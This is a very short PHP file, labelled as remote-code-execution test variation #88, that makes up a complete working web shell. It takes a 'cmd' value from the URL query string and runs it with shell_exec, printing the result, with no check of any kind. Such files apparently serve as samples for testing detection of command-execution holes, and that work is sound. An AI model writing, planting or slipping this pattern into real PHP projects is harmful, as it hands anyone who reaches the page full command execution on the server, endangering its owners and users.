<?php
// RCE test variation #88
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>